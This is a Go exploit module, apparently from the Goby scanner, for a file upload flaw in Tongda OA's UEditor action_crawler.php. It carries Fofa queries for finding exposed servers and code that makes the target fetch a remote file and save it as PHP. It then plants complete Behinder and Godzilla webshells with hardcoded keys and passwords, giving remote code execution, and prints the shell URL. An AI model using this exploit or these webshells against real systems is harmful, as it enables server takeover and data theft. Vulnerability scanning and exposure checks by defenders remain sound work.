package exploits

import (
	"bytes"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tongda OA action_crawler.php File Upload Vulnerability",
    "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation system independently developed by Beijing Tongda Xinke Technology Co., Ltd., including process approval, administrative office, daily affairs, data statistical analysis, instant messaging, mobile office, etc.</p><p>There is a file upload vulnerability in the action_crawler.php file of Tongda OA. Attackers can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Product": "Tongda-OA",
    "Homepage": "http://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "header=\"KEY_RANDOMDATA\" || banner=\"KEY_RANDOMDATA\" || body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"tongda.ico\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere\" || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "header=\"KEY_RANDOMDATA\" || banner=\"KEY_RANDOMDATA\" || body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"tongda.ico\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere\" || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in the action_crawler.php file of Tongda OA. Attackers can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "hello12341x.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php echo \"hello\" ; ?>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/api/upload_crawler.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "{{{param}}}={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "通达 OA action_crawler.php 文件上传漏洞",
            "Product": "TDXK-通达OA",
            "Description": "<p>通达OA（Office Anywhere 网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p><p>通达 OA 的 action_crawler.php 文件存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对文件操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>通达 OA 的 action_crawler.php 文件存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Tongda OA action_crawler.php File Upload Vulnerability",
            "Product": "Tongda-OA",
            "Description": "<p>Tongda OA (Office Anywhere Network Intelligent Office System) is a collaborative office automation system independently developed by Beijing Tongda Xinke Technology Co., Ltd., including process approval, administrative office, daily affairs, data statistical analysis, instant messaging, mobile office, etc.</p><p>There is a file upload vulnerability in the action_crawler.php file of Tongda OA. Attackers can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is a file upload vulnerability in the action_crawler.php file of Tongda OA. Attackers can use the file upload vulnerability to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-12-01",
    "PocId": "10698"
}`
	randomStringfMsBHs9Cf := func(size int) string {
		alpha := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		var buffer bytes.Buffer
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	uploadFlagsfMsBHs9Cf := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		var status int
		// 上传文件
		err := godclient.HostFile(randomStringfMsBHs9Cf(16)+".png", content, func(fileURL string) error {
			uploadRequestConfig := httpclient.NewPostRequestConfig(`/module/ueditor/php/action_crawler.php`)
			uploadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			uploadRequestConfig.VerifyTls = false
			uploadRequestConfig.FollowRedirect = false
			uploadRequestConfig.Data = "CONFIG%5bcatcherPathFormat%5d=/api/" + filename + "&CONFIG%5bcatcherMaxSize%5d=100000&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.php&CONFIG%5bcatcherAllowFiles%5d%5b%5d=.ico&CONFIG%5bcatcherFieldName%5d=file&file[]=" + fileURL + "#.php"
			resp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
			status = resp.StatusCode
			return err
		})
		if err != nil {
			return nil, err
		} else if status != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		checkRequestConfig := httpclient.NewGetRequestConfig("/api/" + filename + ".php")
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			fileName := "test" + goutils.RandomHexString(10)
			content := goutils.RandomHexString(10)
			resp, _ := uploadFlagsfMsBHs9Cf(hostInfo, fileName, `<?php @error_reporting(0);echo "`+content+`";unlink(__FILE__);?>`)
			return resp != nil && strings.Contains(resp.Utf8Html, content)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			fileName := "test" + goutils.RandomHexString(10)
			check := goutils.RandomHexString(10)
			var content string
			if attackType == "behinder" {
				content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION['k']=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded('openssl')){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);echo "` + check + `";?>`
			} else if attackType == "godzilla" {
				content = `<?php @session_start();@set_time_limit(0);@error_reporting(0);function encode($D,$K){for($i=0;$i<strlen($D);$i++){$c=$K[$i+1&15];$D[$i]=$D[$i]^$c;}return $D;}$pass='pass';$payloadName='payload';$key='3c6e0b8a9c15224a';if(isset($_POST[$pass])){$data=encode(base64_decode($_POST[$pass]),$key);if(isset($_SESSION[$payloadName])){$payload=encode($_SESSION[$payloadName],$key);if(strpos($payload,"getBasicsInfo")===false){$payload=encode($payload,$key);}eval($payload);echo substr(md5($pass.$key),0,16);echo base64_encode(encode(@run($data),$key));echo substr(md5($pass.$key),16);}else{if(strpos($data,"getBasicsInfo")!==false){$_SESSION[$payloadName]=encode($data,$key);}}}echo "` + check + `";?>`
			} else if attackType == "custom" {
				content = goutils.B2S(stepLogs.Params["content"])
				fileName = goutils.B2S(stepLogs.Params["filename"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFlagsfMsBHs9Cf(expResult.HostInfo, fileName, content)
			if resp != nil && (resp.StatusCode == 200 || resp.StatusCode == 500) {
				expResult.Success = true
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/api/" + fileName + ".php\n"
				if attackType == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if attackType == "godzilla" {
					expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.1\n"
				}
				expResult.Output += "Webshell type: php"
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
